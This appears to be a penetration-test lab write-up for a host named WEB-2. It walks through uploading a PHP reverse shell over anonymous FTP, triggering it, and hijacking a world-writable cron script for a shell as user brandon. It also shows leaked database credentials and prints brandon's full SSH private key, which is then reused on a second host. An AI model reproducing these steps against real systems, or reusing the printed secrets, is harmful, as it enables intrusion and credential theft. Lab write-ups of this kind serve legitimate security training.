---
description: 10.10.0.103
---

# WEB-2

## Information Gathering

Scanned all TCP ports:

```
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0           10918 Jul 25  2021 index.html
|_drwxrwxrwx    2 0        0            4096 Jul 25  2021 temp [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.0.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 92:c6:96:e8:f6:71:ab:1c:f4:7e:1e:c8:a3:4b:3d:5f (RSA)
|   256 da:8d:4e:d1:cb:2b:b4:53:67:bf:30:1a:df:2e:66:d8 (ECDSA)
|_  256 6a:55:41:1f:85:29:9d:b7:26:3b:78:13:03:25:15:7e (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
443/tcp open  ssl/http nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was https://10.10.0.103/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=10.10.0.103
| Not valid before: 2021-07-17T14:19:12
|_Not valid after:  2021-08-16T14:19:12
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
No UDP ports are open
```

Notes:

* 21/FTP -- Anonymous login allowed -- need to enumerate
  * I immediately reailize that I have rwx permissions in the temp directory

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

* Can we write a file here
  * Made a file called test.txt
  * Attempted to put it in FTP -- it worked!

## Enumeration

### Port 80 - HTTP (Apache)

* Ran directory bruteforce
  * We have a file index on /temp
  * I was able to write a file to it and navigate to it via HTTP (test.txt)
  * Added a PHP reverse shell -- Success
* Ran vhosts -- nothing

### Port 443 - Nginx

{% embed url="https://10.10.0.103/brandon/website-dev/-/commit/9aa71e07f744323c6ebd1fbf568cbe7c234fc0e7" %}

* We see sa credentials for a data base

```
$connectionInfo = array( "Database"=>"gitlab", "UID"=>"sa", "PWD"=>"VeryVeryVerySecure1!");
```

```
sa

VeryVeryVerySecure1!
```

## Exploitation

### FTP Anonymous Access to RCE

This is the exploit I was able to take advantage of to write my PHP reverse shell to and execute via curl.

PHP Reverse Shell Code:

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}

Access Anonymous FTP:

```
ftp 10.10.0.181 -a
put php-reverse-shell.php
exit
```

Begin netcat listener:

```
nc -lnvp 1337
```

Trigger the reverse shell:

```
curl http://10.10.0.103/temp/php-reverse-shell.php
```

* We are now <mark style="color:yellow;">www-data</mark>

## Privilege Escalation

### Local enumeration

* We landed in the root directory
* Time to fix our shell to a more stable /bin/bash

{% content-ref url="../../../fully-interactive-shell-upgrade.md" %}
[fully-interactive-shell-upgrade.md](../../../fully-interactive-shell-upgrade.md)
{% endcontent-ref %}

* Transferred Linpeas with no luck
* Tried switching user and using VeryVeryVerySecure1! but no luck
* Checked LES and nothing

### Possible Hunches

* Apache
* Cronjob
* /etc/log-time.sh is writeable
* /var/opt/gitlab/postgresql/.s.PGSQL.5432
* 21:41 146958 root /usr/sbin/CRON -f
* We see that this cronjob is writeable by anyone!
  * \-rwxrwx<mark style="color:yellow;">rwx</mark> 1 brandon brandon 43 Jul 25 2021 /etc/log-time.sh

### PrivEsc vector

<mark style="color:yellow;">Misconfigured/Vulnerable Cronjob</mark>

* Append our previous PHP reverse shell to the log-time.sh script and wait for it to run as a cronjob!
* Remember, our php-reverse-shell.php is in our /var/www/html/temp/php-reverse-shell.php directory

Start nc listener on kali (it can be the same port since it is already bound):

```
nc -lnvp 1337
```

Command to execute reverse shell:

```
echo "php /var/www/html/temp/php-reverse-shell.php" >> /etc/log-time.sh
```

* Wait one minute and you will receive your reverse shell as Brandon!

### Stealing Brandon's Private Key (SSH)

* cat /home/brandon/.ssh/id\_rsa
* Copy the entire key

id\_rsa:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

* Change permissions of id\_rsa to 600

SSH into WEB2 as Brandon:

```
ssh -i id_rsa brandon@10.10.0.103
```

### Brandon -> Root

* Attempted `sudo -l`
* Looked through running processes
* Transferred linenum.sh
* /etc/vsftpd.conf -x

```
-rwxr-xr-x 1 root root 349 Aug 17  2021 /opt/gitlab/embedded/service/gitlab-shell/bin/authorized_keys
#!/bin/sh
# Legacy script used for AuthorizedKeysCommand when configured without username.
# Executes gitlab-shell-authorized-keys-check with "git" as expected and actual
# username and with the passed key.
#
# TODO: Remove this in https://gitlab.com/gitlab-org/gitlab-shell/issues/209.
$(dirname $0)/gitlab-shell-authorized-keys-check git git $1

PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes
```

/home/brandon/.viminfo -x

I cannot go straight to root unfortunately

### Brandon's private key is reused to access WEB1

```
ssh -i id_rsa brandon@10.10.0.181
```

## Proofs
